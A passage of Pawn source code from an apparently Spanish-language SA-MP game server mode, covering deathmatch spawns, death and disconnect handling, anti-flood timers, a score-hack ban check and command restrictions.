		SetPlayerFightingStyle(playerid, FIGHT_STYLE_BOXING);
		return 1;
	}
	if(pDeathmatch[playerid][pInProDM] == 1)
	{
		new rand = random(sizeof(gInProDM));
		SetPlayerPos(playerid, gInProDM[rand][0], gInProDM[rand][1], gInProDM[rand][2]);
		TogglePlayerControllable(playerid, 1);
		SetPlayerHealth(playerid,99.0);
		SetPlayerInterior(playerid,10);
		ResetPlayerWeapons(playerid);
		GivePlayerWeapon(playerid, 24, 1500);
		GivePlayerWeapon(playerid, 16, 1500);
		GivePlayerWeapon(playerid, 26, 1500);
		GivePlayerWeapon(playerid, 31, 1500);
		GivePlayerWeapon(playerid, 32, 1500);
		GivePlayerWeapon(playerid, 34, 1500);
		GivePlayerWeapon(playerid, 4, 1);
		return 1;
	}
	if(pDeathmatch[playerid][pInMinigunDM] == 1)
	{
		new rand = random(sizeof(gInMinigunDM));
		SetPlayerPos(playerid, gInMinigunDM[rand][0], gInMinigunDM[rand][1], gInMinigunDM[rand][2]);
		TogglePlayerControllable(playerid, 1);
		SetPlayerHealth(playerid,99.0);
		ArmasProhibidas[playerid]=0;
		SetPlayerVirtualWorld(playerid, 1);
		ResetPlayerWeapons(playerid);
		GivePlayerWeapon(playerid, 38, 5000);
		return 1;
	}
	if(pDeathmatch[playerid][pInSniperDM] == 1)
	{
		new rand = random(sizeof(gInSniperDM));
		SetPlayerPos(playerid, gInSniperDM[rand][0], gInSniperDM[rand][1], gInSniperDM[rand][2]);
		TogglePlayerControllable(playerid, 1);
		SetPlayerHealth(playerid,99.0);
		SetPlayerVirtualWorld(playerid, 2);
		ResetPlayerWeapons(playerid);
		GivePlayerWeapon(playerid,34,1500);
		return 1;
	}
	if(pDeathmatch[playerid][pInGuerraDM] == 1)
	{
		new rand = random(sizeof(gInGuerraDM));
		SetPlayerPos(playerid, gInGuerraDM[rand][0], gInGuerraDM[rand][1], gInGuerraDM[rand][2]);
		TogglePlayerControllable(playerid, 1);
		SetPlayerHealth(playerid,99.0);
		ArmasProhibidas[playerid]=0;
		SetPlayerVirtualWorld(playerid, 3);
		ResetPlayerWeapons(playerid);
		new ArmasGDM = random(3);
		if(ArmasGDM == 0) GivePlayerWeapon(playerid,38,5000);
		else if(ArmasGDM == 1) GivePlayerWeapon(playerid,36,1500);
		else if(ArmasGDM == 2) GivePlayerWeapon(playerid,35,2500);
		return 1;
	}

	//=====================================DEVOLVER COLOR GUARDADO==================================//
	    if((dUserINT(PlayerName2(playerid)).("UseColor")) == 1){
		SetPlayerColor(playerid,(dUserINT(PlayerName2(playerid)).("FavColor")) );
	}else{
		new Colores = random(11);
		if(Colores == 0) SetPlayerColor(playerid,0xAFAFAFAA);
		else if(Colores == 1) SetPlayerColor(playerid,0xFFFFFFAA);
		else if(Colores == 2) SetPlayerColor(playerid,0xff0000ff);
		else if(Colores == 3) SetPlayerColor(playerid,0x0000BBAA);
		else if(Colores == 4) SetPlayerColor(playerid,0x00FF00FF);
		else if(Colores == 5) SetPlayerColor(playerid,0xFFFF00AA);
		else if(Colores == 6) SetPlayerColor(playerid,0xFF66FFAA);
		else if(Colores == 7) SetPlayerColor(playerid,0x0096FFFF);
		else if(Colores == 8) SetPlayerColor(playerid,0xFF9600FF);
		else if(Colores == 9) SetPlayerColor(playerid,0xFFD700FF);
		else if(Colores == 10) SetPlayerColor(playerid,0x993300AA);
	}
	INFO[playerid][UsaDrogas] = 0;
	//=====================================DEVOLVER ARMAS GUARDADAS==================================//
	ResetPlayerWeapons(playerid);
	DevolverArmasGuardadas(playerid);
	///Si el player por alguna razon tiene score negativo se lo reseteamos en 0
	if(GetPlayerScore(playerid)<0){
		SetPlayerScore(playerid, 0);
	}
	SavePlayer(playerid);
	//===================================== GUERRA TOTAL ============================================//
	if(GuerraTotal == 1 && BloquearComandosInDerby[playerid]==0 && Joined[playerid] == false && BloquearComandosInDM[playerid] == 0)
	{
		for(new i = 0; i < MAX_PLAYERS; i++)
		{
			ArmasProhibidas[i]=0;
		}
		new ArmasGT = random(3);
		if(ArmasGT == 0) GivePlayerWeapon(playerid,38,5000);
		else if(ArmasGT == 1) GivePlayerWeapon(playerid,36,1500);
		else if(ArmasGT == 2) GivePlayerWeapon(playerid,35,2500);
	}
    return 1;
}

//==========================LAdmin Spectate=====================================
#if defined ENABLE_SPEC
public OnPlayerInteriorChange(playerid, newinteriorid, oldinteriorid)
{
	new x = 0;
	while(x!=MAX_PLAYERS) {
	    if( IsPlayerConnected(x) &&	GetPlayerState(x) == PLAYER_STATE_SPECTATING && PlayerInfo[x][SpecID] == playerid && PlayerInfo[x][SpecType] == ADMIN_SPEC_TYPE_PLAYER )
   		{
   		    SetPlayerInterior(x,newinteriorid);
		}
		x++;
	}
}
#endif

public DropPlayerWeapons(playerid)
{
	new playerweapons[13][2];
	new Float:x,Float:y,Float:z;
	GetPlayerPos(playerid, x, y, z);
	for(new i=0;i<13;i++){
		GetPlayerWeaponData(playerid, i, playerweapons[i][0], playerweapons[i][1]);
		new model1=GetWeaponModel(playerweapons[i][0]);
		new times=floatround(playerweapons[i][1]/10.0001);
		new string[256];
		format(string, sizeof(string), "%d", times);
		times=strval(string);
		new Float:X=x+(random(3)-random(3));
		new Float:Y=y+(random(3)-random(3));
		if(playerweapons[i][1]!=0)
		{
			if(times>PickupLimit) times=PickupLimit;
			for(new a=0;a<times;a++)
			{
				if(model1!=-1)
				{
					new pickupid=CreatePickup(model1, 3, X, Y, z);
					SetTimerEx("DeletePickup", DeleteTime*1000, false, "d", pickupid);
				}
			}
		}
	}
	return 1;
}

public DeletePickup(pickupid)
{
	DestroyPickup(pickupid);
	return 1;
}

public GetWeaponModel(weaponid)
{
	new model2;
	switch(weaponid)
	{
		case 1: model2=331; case 2: model2=333; case 3: model2=334;
		case 4: model2=335; case 5: model2=336; case 6: model2=337;
		case 7: model2=338; case 8: model2=339; case 9: model2=341;
		case 10: model2=321; case 11: model2=322; case 12: model2=323;
		case 13: model2=324; case 14: model2=325; case 15: model2=326;
		case 16: model2=342; case 17: model2=343; case 18: model2=344;
		case 22: model2=346; case 23: model2=347; case 24: model2=348;
		case 25: model2=349; case 26: model2=350; case 27: model2=351;
		case 28: model2=352; case 29: model2=353; case 30: model2=355;
		case 31: model2=356; case 32: model2=372; case 33: model2=357;
		case 34: model2=358; case 35: model2=359; case 36: model2=360;
		case 37: model2=361; case 38: model2=362; case 39: model2=363;
		case 41: model2=365; case 42: model2=366; case 46: model2=371;
	}
	if(model2<300) return -1;
	return model2;
}

public OnPlayerDeath(playerid, killerid, reason)
{
	new kstring[128], pstring[128];
   	new kname[MAX_PLAYER_NAME];
	new pname[MAX_PLAYER_NAME], deathreason[20];
	SendDeathMessage(killerid,playerid,reason);
	GetPlayerName(playerid, pname, sizeof(pname));
	GetWeaponName(reason, deathreason, 20);
	new killer[MAX_PLAYER_NAME];
	GetPlayerName(killerid, killer, sizeof(killer));
	SetPlayerScore(killerid, GetPlayerScore(killerid) + 1);
	GivePlayerMoney(killerid, 5000);
	new veh = GetPlayerVehicleID(playerid);
	if(GetVehicleModel(veh) == 463){
		if(GhostRiderObjects[playerid][0]){GhostRiderDesactivar(playerid); return 1;}
	}
	//SavePlayer(playerid);
	BloquearComandosInBank[playerid] = 0;
    BloquearComandosInRace[playerid] = 0;
    DropPlayerWeapons(playerid);
    if(PlayerInfo[killerid][God] == 1){
		SendClientMessage(killerid,red, "|Info| »{EAEAEA} No puedes matar cuando tienes el god activado. NO ABUSES!");
  		ResetPlayerWeapons(killerid);
        SetPlayerHealth(killerid,0.0);
        //cmd_jail(playerid,"\1");
    }
    
	if(Joined[playerid]!=true)
	{
 		if(GetPlayerState(killerid) == PLAYER_STATE_DRIVER || GetPlayerState(killerid) == PLAYER_STATE_PASSENGER )
    	{
        	SendClientMessage(killerid, red, "|Info| »{EAEAEA} No puedes matar estando en un vehiculo.");
        	ResetPlayerWeapons(killerid);
        	SetPlayerHealth(killerid, 0.0);
    	}
	}
    //======================================== SISTEMA DE DERBY ==============================================
   	if(PI[playerid][P_GAMEMODE] == GAME_DERBY && DI[STATUS] == DERBY_RUNNING && DI[ACTIVE_PLAYERS] > 1) PlayerDerbyDead(playerid);
	PI[playerid][P_STATUS] = STATUS_DEAD;
	//======================================= CARRERAS =======================================================
    if(Joined[playerid] == true)
    {
		JoinCount--;
		Joined[playerid] = false;
		SetPVarInt(playerid, "JoinedToRRAce", false);
		DestroyVehicle(CreatedRaceVeh[playerid]);
		DisablePlayerRaceCheckpoint(playerid);
		CPProgess[playerid] = 0;
		Race[InRace]--;
        pRace[playerid][pInRace] = 0;
    	TextDrawHideForPlayer(playerid, TRace);
   		TextDrawHideForPlayer(playerid, TRaceTiempoRestante);
   		TextDrawHideForPlayer(playerid, TRaceJugadores);
   		TextDrawHideForPlayer(playerid, TCheckpoint);
		TextDrawHideForPlayer(playerid, TRaceTiempoRestante2[playerid]);
		TextDrawHideForPlayer(playerid, TRaceJugadores2[playerid]);
		TextDrawHideForPlayer(playerid, TCheckpoint2[playerid]);
		TextDrawShowForPlayer(playerid, TComandos);
		PlayerInfo[playerid][DoorsLocked] = 0;
		KillTimer(InfoTimer[playerid]);
		#if defined RACE_IN_OTHER_WORLD
		SetPlayerVirtualWorld(playerid, 0);
		#endif
	}
	if(BuildRace == playerid+1) BuildRace = 0;
	new Texto[128];
	new Nombre[MAX_PLAYER_NAME];
	if(AntiFakeKill==1)
	{
		if(Muertes[playerid] == 0)
		{
			MuerteReciente[playerid] = gettime();
		}
		Muertes[playerid]++;
		if(Muertes[playerid] == 3)
		{
			if((gettime() - MuerteReciente[playerid]) <= 3)
			{
				GetPlayerName(playerid, Nombre, sizeof(Nombre));
				format(Texto, sizeof(Texto), "{EAEAEA}%s(%d) ha sido baneado. {FF0000}(Posible Score Hack)", Nombre, playerid);
				SendClientMessageToAll(red, Texto);
				SaveToFile("BanLog",Texto);
				if(udb_Exists(PlayerName2(playerid)) && PlayerInfo[playerid][LoggedIn] == 1) dUserSetINT(PlayerName2(playerid)).("banned",1);
				BanEx(playerid, "Baneado por posible Score Hack");
			}
			else if((gettime() - MuerteReciente[playerid]) > 3)
			{

				Muertes[playerid] = 0;
			}
		}
	}
	GetPlayerName(playerid, pname, sizeof(pname));
	format(kstring, sizeof(kstring), "~n~~n~~n~~n~~n~~n~~n~~n~~w~Mataste a~n~~g~%s",pname);
	GameTextForPlayer(killerid, kstring, 2500,3);
	GetPlayerName(killerid, kname, sizeof(kname));
	format(pstring, sizeof(pstring), "~n~~n~~n~~n~~n~~n~~n~~n~~w~Te mato~n~~g~%s",kname);
	GameTextForPlayer(playerid, pstring, 2500,3);
	PlayerInfo[playerid][Deaths]++;
	PlayerInfo[killerid][Kills]++;
    ArmasProhibidas[playerid]=1;
	IsSpawned[playerid] = 0;
	LawEnforcementRadio[playerid] = 0;
	HasLawEnforcementRadio[playerid] = 0;
	ReqBk[playerid] = 0;
	ReqBkRecent[playerid] = 0;
	ReportedRecent[playerid] = 0;
	StoleCopCarRecent[playerid] = 0;
	triedtoescaperecent[playerid] = 0;
	JailTime[playerid] = 0;
	JailTimeServed[playerid] = 0;
	copshavevc[playerid] = 0;
	OldCash[playerid] = 0;
	commitedcrimerecently[playerid] = 0;
	RobbedPlyRecent[playerid] = 0;
	beenrobbedrecently[playerid] = 0;
	StopFly(playerid);
    return 1;
}
//==============================Player Disconnect===============================
public OnPlayerDisconnect(playerid,reason)
{
    KZI_OnPlayerDisconnect(playerid,0);
    if(ServerInfo[ConnectMessages] == 1)
    {
		new string[600];
		format(string, sizeof string, "{EAEAEA}%s(%d) ha salido de el servidor.", pName(playerid),playerid);
		print(string);
		SendClientMessageToAll(red, string);
	}
	if(pDerby[playerid][pInDerby1]){
 		Derby[InDerby]--;
		TextDrawHideForPlayer(playerid, TDerby);
		TextDrawHideForPlayer(playerid, TJugadores);
		TextDrawHideForPlayer(playerid, TComandosDM);
		TextDrawShowForPlayer(playerid, TComandos);
	    new string[10];
		format(string,sizeof(string),"%d", Derby[InDerby]);
		TextDrawSetString(TJugadores2, string);
	}
	
    if(pDeathmatch[playerid][pInDM1])
	{
 		TextDrawHideForPlayer(playerid, TDeathmatch);
		TextDrawHideForPlayer(playerid, TJugadores);
		TextDrawHideForPlayer(playerid, TJugadores2);
		TextDrawHideForPlayer(playerid, TComandosDM);
   		TextDrawShowForPlayer(playerid, TComandos);
	    pDeathmatch[playerid][pInDM1]=0;
	    Deathmatch[InDM1]--;
	    new string[10];
		format(string,sizeof(string),"%d", Deathmatch[InDM1]);
		TextDrawSetString(TJugadores2, string);
	}
	if(pDeathmatch[playerid][pInDM2])
	{
		TextDrawHideForPlayer(playerid, TDeathmatch);
		TextDrawHideForPlayer(playerid, TJugadores);
		TextDrawHideForPlayer(playerid, TJugadores2);
		TextDrawHideForPlayer(playerid, TComandosDM);
   		TextDrawShowForPlayer(playerid, TComandos);
	    pDeathmatch[playerid][pInDM2]=0;
	    Deathmatch[InDM2]--;
	    new string[10];
		format(string,sizeof(string),"%d", Deathmatch[InDM2]);
		TextDrawSetString(TJugadores2, string);
	}
	if(pDeathmatch[playerid][pInDM3])
	{
		TextDrawHideForPlayer(playerid, TDeathmatch);
		TextDrawHideForPlayer(playerid, TJugadores);
		TextDrawHideForPlayer(playerid, TJugadores2);
		TextDrawHideForPlayer(playerid, TComandosDM);
   		TextDrawShowForPlayer(playerid, TComandos);
	    pDeathmatch[playerid][pInDM3]=0;
	    Deathmatch[InDM3]--;
	    new string[10];
		format(string,sizeof(string),"%d", Deathmatch[InDM3]);
		TextDrawSetString(TJugadores2, string);
	}
	if(pDeathmatch[playerid][pInDM4])
	{
		TextDrawHideForPlayer(playerid, TDeathmatch);
		TextDrawHideForPlayer(playerid, TJugadores);
		TextDrawHideForPlayer(playerid, TJugadores2);
		TextDrawHideForPlayer(playerid, TComandosDM);
   		TextDrawShowForPlayer(playerid, TComandos);
	    pDeathmatch[playerid][pInDM4]=0;
	    Deathmatch[InDM4]--;
	    new string[10];
		format(string,sizeof(string),"%d", Deathmatch[InDM4]);
		TextDrawSetString(TJugadores2, string);
	}
	if(pDeathmatch[playerid][pInMiniDM])
	{
		TextDrawHideForPlayer(playerid, TDeathmatch);
		TextDrawHideForPlayer(playerid, TJugadores);
		TextDrawHideForPlayer(playerid, TJugadores2);
		TextDrawHideForPlayer(playerid, TComandosDM);
   		TextDrawShowForPlayer(playerid, TComandos);
	    pDeathmatch[playerid][pInMiniDM]=0;
	    Deathmatch[InMiniDM]--;
	    new string[10];
		format(string,sizeof(string),"%d", Deathmatch[InMiniDM]);
		TextDrawSetString(TJugadores2, string);
	}
	if(pDeathmatch[playerid][pInMiniDM2])
	{
		TextDrawHideForPlayer(playerid, TDeathmatch);
		TextDrawHideForPlayer(playerid, TJugadores);
		TextDrawHideForPlayer(playerid, TJugadores2);
		TextDrawHideForPlayer(playerid, TComandosDM);
   		TextDrawShowForPlayer(playerid, TComandos);
	    pDeathmatch[playerid][pInMiniDM2]=0;
	    Deathmatch[InMiniDM2]--;
	    new string[10];
		format(string,sizeof(string),"%d", Deathmatch[InMiniDM2]);
		TextDrawSetString(TJugadores2, string);
	}
	if(pDeathmatch[playerid][pInDesmadre])
	{
		TextDrawHideForPlayer(playerid, TDeathmatch);
		TextDrawHideForPlayer(playerid, TJugadores);
		TextDrawHideForPlayer(playerid, TJugadores2);
		TextDrawHideForPlayer(playerid, TComandosDM);
   		TextDrawShowForPlayer(playerid, TComandos);
	    pDeathmatch[playerid][pInDesmadre]=0;
	    Deathmatch[InDesmadre]--;
	    new string[10];
		format(string,sizeof(string),"%d", Deathmatch[InDesmadre]);
		TextDrawSetString(TJugadores2, string);
	}
	if(pDeathmatch[playerid][pInBoxDM])
	{
		TextDrawHideForPlayer(playerid, TDeathmatch);
		TextDrawHideForPlayer(playerid, TJugadores);
		TextDrawHideForPlayer(playerid, TJugadores2);
		TextDrawHideForPlayer(playerid, TComandosDM);
   		TextDrawShowForPlayer(playerid, TComandos);
	    pDeathmatch[playerid][pInBoxDM]=0;
	    Deathmatch[InBoxDM]--;
	    new string[10];
		format(string,sizeof(string),"%d", Deathmatch[InBoxDM]);
		TextDrawSetString(TJugadores2, string);
	}
	if(pDeathmatch[playerid][pInProDM])
	{
		TextDrawHideForPlayer(playerid, TDeathmatch);
		TextDrawHideForPlayer(playerid, TJugadores);
		TextDrawHideForPlayer(playerid, TJugadores2);
		TextDrawHideForPlayer(playerid, TComandosDM);
   		TextDrawShowForPlayer(playerid, TComandos);
	    pDeathmatch[playerid][pInProDM]=0;
	    Deathmatch[InProDM]--;
	    new string[10];
		format(string,sizeof(string),"%d", Deathmatch[InProDM]);
		TextDrawSetString(TJugadores2, string);
	}
	if(pDeathmatch[playerid][pInMinigunDM])
	{
		TextDrawHideForPlayer(playerid, TDeathmatch);
		TextDrawHideForPlayer(playerid, TJugadores);
		TextDrawHideForPlayer(playerid, TJugadores2);
		TextDrawHideForPlayer(playerid, TComandosDM);
   		TextDrawShowForPlayer(playerid, TComandos);
	    pDeathmatch[playerid][pInMinigunDM]=0;
	    Deathmatch[InMinigunDM]--;
	    new string[10];
		format(string,sizeof(string),"%d", Deathmatch[InMinigunDM]);
		TextDrawSetString(TJugadores2, string);
	}
	if(pDeathmatch[playerid][pInSniperDM])
	{
 		TextDrawHideForPlayer(playerid, TDeathmatch);
		TextDrawHideForPlayer(playerid, TJugadores);
		TextDrawHideForPlayer(playerid, TJugadores2);
		TextDrawHideForPlayer(playerid, TComandosDM);
   		TextDrawShowForPlayer(playerid, TComandos);
	    pDeathmatch[playerid][pInSniperDM]=0;
	    Deathmatch[InSniperDM]--;
	    new string[10];
		format(string,sizeof(string),"%d", Deathmatch[InSniperDM]);
		TextDrawSetString(TJugadores2, string);
	}
	if(pDeathmatch[playerid][pInGuerraDM])
	{
 		TextDrawHideForPlayer(playerid, TDeathmatch);
		TextDrawHideForPlayer(playerid, TJugadores);
		TextDrawHideForPlayer(playerid, TJugadores2);
		TextDrawHideForPlayer(playerid, TComandosDM);
   		TextDrawShowForPlayer(playerid, TComandos);
	    pDeathmatch[playerid][pInGuerraDM]=0;
	    Deathmatch[InGuerraDM]--;
	    new string[10];
		format(string,sizeof(string),"%d", Deathmatch[InGuerraDM]);
		TextDrawSetString(TJugadores2, string);
	}
	if(Joined[playerid] == true)
    {
		JoinCount--;
		Joined[playerid] = false;
		SetPVarInt(playerid, "JoinedToRRAce", false);
		DestroyVehicle(CreatedRaceVeh[playerid]);
		DisablePlayerRaceCheckpoint(playerid);
		CPProgess[playerid] = 0;
		KillTimer(InfoTimer[playerid]);
		Race[InRace]--;
        pRace[playerid][pInRace] = 0;
    	TextDrawHideForPlayer(playerid, TRace);
   		TextDrawHideForPlayer(playerid, TRaceTiempoRestante);
   		TextDrawHideForPlayer(playerid, TRaceJugadores);
   		TextDrawHideForPlayer(playerid, TCheckpoint);
		TextDrawHideForPlayer(playerid, TRaceTiempoRestante2[playerid]);
		TextDrawHideForPlayer(playerid, TRaceJugadores2[playerid]);
		TextDrawHideForPlayer(playerid, TCheckpoint2[playerid]);
		TextDrawShowForPlayer(playerid, TComandos);
		#if defined RACE_IN_OTHER_WORLD
		SetPlayerVirtualWorld(playerid, 0);
		#endif
	}
	//=======================GHOSTRIDER=============================
	DestroyObject(GhostRiderObjects[playerid][0]);
    DestroyObject(GhostRiderObjects[playerid][1]);
    DestroyObject(GhostRiderObjects[playerid][2]);
    GhostRiderObjects[playerid][0]=0;
	//=======================SISTEMA DE DERBY=============================
	if(PI[playerid][P_GAMEMODE] == GAME_DERBY) KickPlayerFromDerby(playerid);
	new tmp[PLAYER_INFO];
	PI[playerid] = tmp;
 	BloquearComandosInDerby[playerid] = 0;
	/////////////////////////////////////////////
	if(BuildRace == playerid+1) BuildRace = 0;
    BloquearComandosInRace[playerid] = 0;
    TextDrawHideForPlayer(playerid,vehiclehpbar[playerid]); //Textdraw vida vehiculo
    RemovePlayerAttachedObject(playerid, 0);
    PlayerInfo[playerid][DesactivarChat] = 0;
    ColorGris[playerid] = 0;
    ColorMarron[playerid] = 0;
    ColorDorado[playerid] = 0;
    ColorVioleta[playerid] = 0;
    ColorNaranja[playerid] = 0;
    ColorCeleste[playerid] = 0;
    ColorRosa[playerid] = 0;
    ColorAmarillo[playerid] = 0;
    ColorVerde[playerid] = 0;
    ColorAzul[playerid] = 0;
    ColorRojo[playerid] = 0;
    ColorNegro[playerid] = 0;
    TagOwner[playerid] = 0;
    TagEncargado[playerid] = 0;
    TagAdmin2[playerid] = 0;
    TagAdmin[playerid] = 0;
    TagVip[playerid] = 0;
    TagActivado[playerid] = 0;
    ChatColorActivado[playerid] = 0;
    ArmasProhibidas[playerid]=1;
    StopFly(playerid);
    Glow[playerid] = 0;
    KillTimer(vremea[playerid]);
    ColorCar[playerid] = 0;
    crazycar[playerid] = 0;
    MegaJump[playerid] = 0;
	FireShotON[playerid] = false;//Auto Tanque
	PlayerAutoCBUG[playerid] = 0;
    AceleracionBrutal[playerid] = false; // Reseteamos la variable
	SaltosVehiculo[playerid] = false;
    if(CreatedRamp[playerid] == true) DestroyObject(Ramp[playerid]), CreatedRamp[playerid] = false;
	CreatedRamp[playerid] = false;
	Enabled[playerid]=0;
	Pers[playerid]=0;
    DPM[playerid] = false;
    BloquearComandosInBank[playerid] = 0;
    SendDeathMessage(INVALID_PLAYER_ID, playerid, 201);
	if(PlayerInfo[playerid][LoggedIn] == 1)	SavePlayer(playerid);
	if(udb_Exists(PlayerName2(playerid))) dUserSetINT(PlayerName2(playerid)).("loggedin",0);
  	PlayerInfo[playerid][LoggedIn] = 0;
	PlayerInfo[playerid][Level] = 0;
	PlayerInfo[playerid][Vip] = 0;
	PlayerInfo[playerid][Jailed] = 0;
	PlayerInfo[playerid][Frozen] = 0;
	PlayerInfo[playerid][Twin] = 0;
	PlayerInfo[playerid][Rwin] = 0;
    PlayerInfo[playerid][Hide] = 0;
    PlayerInfo[playerid][DesactivarChat] = 0;
    PlayerInfo[playerid][DoorsLocked] = 0;

	if(PlayerInfo[playerid][Jailed] == 1) KillTimer( JailTimer[playerid] );
	if(PlayerInfo[playerid][Frozen] == 1) KillTimer( FreezeTimer[playerid] );
	if(ServerInfo[Locked] == 1)	KillTimer( LockKickTimer[playerid] );

	Jugadores = IDMayor(playerid);
     if(BotServidor[playerid]) BotServidor[playerid] = false;
     if(Barra[playerid] != -1)
     {
     KillTimer(Barra[playerid]);
     Barra[playerid] = -1;
     }
     Advertencias[playerid] = 0;
	#if defined ENABLE_SPEC
	for(new x=0; x<MAX_PLAYERS; x++)
	    if(GetPlayerState(x) == PLAYER_STATE_SPECTATING && PlayerInfo[x][SpecID] == playerid)
   		   	AdvanceSpectate(x);
	#endif
	new reasonMsg[8];
	switch(reason)
	{
		case 0: { reasonMsg = "Timeout"; }
		case 1: { reasonMsg = "Leaving"; }
		case 2: { reasonMsg = "Kicked"; }
	}
	return 1;
}

forward DelayKillPlayer(playerid);
public DelayKillPlayer(playerid)
{
	SetPlayerHealth(playerid,0.0);
	ForceClassSelection(playerid);
}
forward DAntiFlood(playerid);
public DAntiFlood(playerid)
{
	AntiFlood[playerid] = false;
	return 0;
}
forward AntiFloodVida(playerid);
public AntiFloodVida(playerid)
{
	UsarVida[playerid] = 0;
	return 0;
}
forward AntiFloodArmadura(playerid);
public AntiFloodArmadura(playerid)
{
	UsarArmadura[playerid] = 0;
	return 0;
}
forward AntiFloodArmas(playerid);
public AntiFloodArmas(playerid)
{
	UsarArmas[playerid] = 0;
	return 0;
}
forward AntiFloodVehiculos(playerid);
public AntiFloodVehiculos(playerid)
{
	UsarVehiculos[playerid] = 0;
	return 0;
}
public OnVehicleDamageStatusUpdate(vehicleid, playerid)
{
    if(BloquearComandosInDM[playerid] == 0)
    if(Joined[playerid] == false)
    if(PlayerInfo[playerid][Vip] >=1) {
    new panels, doors, lights2, tires;
    GetVehicleDamageStatus(vehicleid, panels, doors, lights2, tires);
    tires = encode_tires(0, 0, 0, 0);
    panels = encode_panels(0, 0, 0, 0, 0, 0, 0);
    doors = encode_doors(0, 0, 0, 0, 0, 0);
    lights2 = encode_lights2(0, 0, 0, 0);
    SetVehicleHealth(vehicleid,1000.0);
    UpdateVehicleDamageStatus(vehicleid, panels, doors, lights2, tires);
    }
    return 1;
}

encode_tires(tire1, tire2, tire3, tire4) return tire1 | (tire2 << 1) | (tire3 << 2) | (tire4 << 3);
encode_panels(flp, frp, rlp, rrp, windshield, front_bumper, rear_bumper)
{
    return flp | (frp << 4) | (rlp << 8) | (rrp << 12) | (windshield << 16) | (front_bumper << 20) | (rear_bumper << 24);
}
encode_doors(bonnet, boot, driver_door, passenger_door, behind_driver_door, behind_passenger_door)
{
    #pragma unused behind_driver_door
    #pragma unused behind_passenger_door
    return bonnet | (boot << 8) | (driver_door << 16) | (passenger_door << 24);
}
encode_lights2(light1, light2, light3, light4)
{
    return light1 | (light2 << 1) | (light3 << 2) | (light4 << 3);
}
public MSeconds()
{
	for(new i = 0; i < MAX_PLAYERS; i++)
	{
		if(Glow[i]==1)
		{
			GlowColor = GlowColor+1;
        	if(GlowColor==36)
			{
				GlowColor=0;
			}
        	SetPlayerColor(i,GlowColors[GlowColor]);
		}
	}
	return 1;
}
public OnPlayerCommandPerformed(playerid, cmdtext[], success)
{
	if(success == 0)
	{
	    GameTextForPlayer(playerid, "~w~Comando Incorrecto~n~~r~/Comandos",2500,3);
	    return 1;
	}
	return 1;
}
//==============================================================================
public OnPlayerCommandReceived(playerid, cmdtext[])
{
	if(IsSpawned[playerid] == 0) return SendClientMessage(playerid,red, "|Error| »{EAEAEA} Debes spawnear para poder utilizar comandos.");
	if(BloquearComandosInDerby[playerid] == 1  && strfind(cmdtext,"/salir",true) == -1)
    if(BloquearComandosInDerby[playerid] == 1) return SendClientMessage(playerid, red, "|Error| »{EAEAEA} No puedes usar comandos en derby, usa {C0C0C0}/salir{EAEAEA} para salir del derby.");
    if(BloquearComandosInRace[playerid] == 1  && strfind(cmdtext,"/salir",true) == -1)
    if(BloquearComandosInRace[playerid] == 1) return SendClientMessage(playerid, red, "|Error| »{EAEAEA} No puedes usar comandos en una carrera, usa {C0C0C0}/salir{EAEAEA} para salir de la carrera.");
    if(BloquearComandosInDM[playerid] == 1  && strfind(cmdtext,"/salir",true) == -1)
    if(BloquearComandosInDM[playerid] == 1  && strfind(cmdtext,"/Kill",true) == -1)
    if(BloquearComandosInDM[playerid] == 1  && strfind(cmdtext,"/Estilos",true) == -1)
    if(BloquearComandosInDM[playerid] == 1  && strfind(cmdtext,"/Pm",true) == -1)
    if(BloquearComandosInDM[playerid] == 1  && strfind(cmdtext,"/APm",true) == -1)
    if(BloquearComandosInDM[playerid] == 1  && strfind(cmdtext,"/DPm",true) == -1)
	if(BloquearComandosInDM[playerid] == 1 ) return SendClientMessage(playerid, red, "|Error| »{EAEAEA} No puedes usar este comando en un DM, usa {C0C0C0}/salir{EAEAEA} para salir del DM.");
    if(BloquearComandosInBank[playerid] == 1  && strfind(cmdtext,"/bankcmds",true) == -1)
    if(BloquearComandosInBank[playerid] == 1  && strfind(cmdtext,"/bank",true) == -1)
    if(BloquearComandosInBank[playerid] == 1  && strfind(cmdtext,"/exitbank",true) == -1)
    if(BloquearComandosInBank[playerid] == 1  && strfind(cmdtext,"/robbank",true) == -1)
    if(BloquearComandosInBank[playerid] == 1  && strfind(cmdtext,"/balance",true) == -1)
    if(BloquearComandosInBank[playerid] == 1  && strfind(cmdtext,"/deposit",true) == -1)
    if(BloquearComandosInBank[playerid] == 1  && strfind(cmdtext,"/withdraw",true) == -1)
    if(BloquearComandosInBank[playerid] == 1  && strfind(cmdtext,"/dardinero",true) == -1)
    if(BloquearComandosInBank[playerid] == 1  && strfind(cmdtext,"/rob",true) == -1)
    if(BloquearComandosInBank[playerid] == 1) return SendClientMessage(playerid, red, "|Error| »{EAEAEA} Solo puedes usar los comandos de {C0C0C0}/BankCmds{EAEAEA} en el banco.");
	if(AntiFlood[playerid] && PlayerInfo[playerid][Level] < 10) return SendClientMessage(playerid, red, "|Error| »{EAEAEA} Debes esperar 2 segundos para volver a usar otro comando.");
    SetTimerEx("DAntiFlood", 2000, false, "i", playerid);
    AntiFlood[playerid] = true;
    if(PlayerInfo[playerid][Frozen] == 1 && PlayerInfo[playerid][Level] < 10) return SendClientMessage(playerid,red,"|Error| »{EAEAEA} No puedes usar comandos estando congelado.");
	if(PlayerInfo[playerid][Jailed] == 1 && PlayerInfo[playerid][Level] < 10) return SendClientMessage(playerid,red,"|Error| »{EAEAEA} No puedes usar comandos estando en la cárcel.");
    new string[128];
	new idx;
	string = strtok(cmdtext, idx);
 //================ [ Read Comamands ] ===========================//
	if(ServerInfo[ReadCmds] == 1)
	{
		format(string, sizeof(string), "> %s[%d] uso el comando: %s", pName(playerid),playerid,cmdtext);
		for(new i = 0; i < MAX_PLAYERS; i++) {
			if(IsPlayerConnected(i)) {
				if( (PlayerInfo[i][Level] > PlayerInfo[playerid][Level]) && (PlayerInfo[i][Level] > 5) && (i != playerid) ) {
					SendClientMessage(i, grey, string);
				}
			}
		}
	}
return 0;
}

public AntiSpawnKill(playerid)
{
	TogglePlayerControllable(playerid, 1);
	SetPlayerArmour(playerid,99.0);
	SetPlayerHealth(playerid,99.0);
	return 1;
}

public CargarObjetos(playerid)
{
	TogglePlayerControllable(playerid, 1);
	return 1;
}


forward OnPlayerWeaponShot(playerid, weaponid, hittype, hitid, Float:fX, Float:fY, Float:fZ);
public OnPlayerWeaponShot( playerid, weaponid, hittype, hitid, Float:fX, Float:fY, Float:fZ)
{
    new UsandoWeaponHacks[128];
